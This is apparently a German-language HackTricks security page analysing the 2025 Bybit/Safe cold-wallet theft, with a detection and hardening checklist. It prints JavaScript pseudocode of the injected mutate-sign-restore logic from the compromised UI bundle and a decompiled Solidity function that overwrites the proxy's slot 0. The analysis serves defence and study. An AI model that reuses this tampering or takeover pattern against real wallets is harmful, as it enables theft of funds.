# Web3 Signing-Workflow-Kompromittierung & Safe Delegatecall Proxy-Übernahme

{{#include ../../banners/hacktricks-training.md}}

## Übersicht

Eine Cold-Wallet-Diebstahlkette kombinierte eine **Supply-Chain-Kompromittierung der Safe{Wallet} web UI** mit einem **on-chain delegatecall-Primitive, das den Implementationszeiger eines Proxys (slot 0) überschrieb**. Die wichtigsten Erkenntnisse sind:

- Wenn eine dApp Code in den Signierpfad injizieren kann, kann sie einen Signer dazu bringen, eine gültige **EIP-712 signature über vom Angreifer gewählte Felder** zu erstellen, während sie die ursprünglichen UI-Daten wiederherstellt, sodass andere Signer nichts bemerken.
- Safe proxies speichern `masterCopy` (implementation) in **storage slot 0**. Ein delegatecall zu einem Vertrag, der in slot 0 schreibt, führt effektiv zu einem „Upgrade“ des Safe auf Angreifer-Logik und verschafft vollständige Kontrolle über das Wallet.

## Off-chain: Zielgerichtete Signatur-Manipulation in Safe{Wallet}

Ein manipuliertes Safe-Bundle (`_app-*.js`) griff selektiv bestimmte Safe- + signer-Adressen an. Die injizierte Logik wurde unmittelbar vor dem Signaturaufruf ausgeführt:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Angriffsmerkmale
- **Context-gated**: hartkodierte Allowlists für betroffene Safes/Signers reduzierten Noise und senkten die Erkennungswahrscheinlichkeit.
- **Last-moment mutation**: Felder (`to`, `data`, `operation`, gas) wurden unmittelbar vor `signTransaction` überschrieben und anschließend zurückgesetzt, sodass Proposal-Payloads in der UI harmlos wirkten, während die Signaturen mit der Angreifer-Payload übereinstimmten.
- **EIP-712 opacity**: Wallets zeigten strukturierte Daten, dekodierten jedoch nicht verschachteltes calldata und hoben `operation = delegatecall` nicht hervor, wodurch die mutierte Nachricht faktisch blind-signed wurde.

### Relevanz der Gateway-Validierung
Safe proposals werden an das **Safe Client Gateway** übermittelt. Vor den verschärften Prüfungen konnte das Gateway ein Proposal akzeptieren, bei dem `safeTxHash`/Signatur zu anderen Feldern als dem JSON-Body passte, falls die UI diese nach dem Signieren umschrieb. Nach dem Vorfall lehnt das Gateway nun Proposals ab, deren Hash/Signatur nicht mit der eingereichten Transaction übereinstimmen. Eine ähnliche serverseitige Hash-Verifikation sollte für jede signing-orchestration API durchgesetzt werden.

### 2025 Bybit/Safe Vorfall-Highlights
- Der Cold-Wallet-Drain am 21. Februar 2025 bei Bybit (~401k ETH) nutzte dasselbe Muster: ein kompromittiertes Safe S3 bundle wurde nur für Bybit-Signer ausgelöst und tauschte `operation=0` → `1`, wobei `to` auf einen vorab deployten Angreifer-Contract zeigte, der slot 0 beschreibt.
- Wayback-cached `_app-52c9031bfa03da47.js` zeigt die Logik, die auf Bybits Safe (`0x1db9…cf4`) und Signer-Adressen abzielte, und wurde dann zwei Minuten nach der Ausführung sofort auf ein sauberes bundle zurückgerollt, was den “mutate → sign → restore”-Trick widerspiegelt.
- Der bösartige Contract (z.B. `0x9622…c7242`) enthielt einfache Funktionen `sweepETH/sweepERC20` plus eine `transfer(address,uint256)`, die den implementation slot schreibt. Die Ausführung von `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` verschob die Proxy-Implementation und gewährte volle Kontrolle.

## On-chain: Delegatecall-Proxy-Übernahme durch Slot-Kollision

Safe proxies halten `masterCopy` in **storage slot 0** und delegieren alle Logik dorthin. Da Safe **`operation = 1` (delegatecall)** unterstützt, kann jede signierte transaction auf einen beliebigen Contract zeigen und dessen Code im Storage-Kontext des Proxy ausführen.

Ein Angreifer-Contract mimte ein ERC-20 `transfer(address,uint256)`, schrieb jedoch stattdessen `_to` in slot 0:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Ablauf:
1. Opfer signieren `execTransaction` mit `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Die masterCopy des Safe validiert Signaturen über diese Parameter.
3. Proxy führt ein delegatecall in `attackerContract` aus; der `transfer`-Code schreibt Slot 0.
4. Slot 0 (`masterCopy`) zeigt jetzt auf vom Angreifer kontrollierte Logik → **vollständige Übernahme der Wallet und Mittelabfluss**.

### Guard & version notes (post-incident hardening)
- Safes >= v1.3.0 können einen **Guard** installieren, um `delegatecall` zu verhindern oder ACLs auf `to`/selectors durchzusetzen; Bybit lief v1.1.1, daher existierte kein Guard-Hook. Ein Upgrade der Smart Contracts (und das erneute Hinzufügen der Eigentümer) ist erforderlich, um diese Kontrollebene zu erhalten.

## Detection & hardening checklist

- **UI integrity**: JS-Assets pinnen / SRI verwenden; Bundle-Diffs überwachen; die Signing-UI als Teil der Vertrauensgrenze behandeln.
- **Sign-time validation**: Hardware-Wallets mit **EIP-712 clear-signing**; `operation` explizit anzeigen und verschachtelte calldata decodieren. Signaturen ablehnen, wenn `operation = 1`, sofern die Richtlinie dies nicht erlaubt.
- **Server-side hash checks**: Gateways/Services, die Proposals weiterleiten, müssen `safeTxHash` neu berechnen und prüfen, dass Signaturen zu den übergebenen Feldern passen.
- **Policy/allowlists**: Preflight-Regeln für `to`, selectors, Asset-Typen und `delegatecall` außer für geprüfte Flows verbieten. Einen internen Policy-Service verlangen, bevor vollständig signierte Transaktionen verbreitet werden.
- **Contract design**: Vermeide das Offenlegen beliebiger `delegatecall` in multisig/treasury Wallets, außer wenn unbedingt nötig. Upgrade-Pointer nicht in Slot 0 platzieren oder mit expliziter Upgrade-Logik und Access-Control absichern.
- **Monitoring**: Alarme bei `delegatecall`-Ausführungen aus Wallets mit Treasury-Fonds und bei Proposals, die `operation` von üblichen `call`-Mustern ändern.

## References

- [AnChain.AI forensic breakdown of the Bybit Safe exploit](https://www.anchain.ai/blog/bybit)
- [Zero Hour Technology analysis of the Safe bundle compromise](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
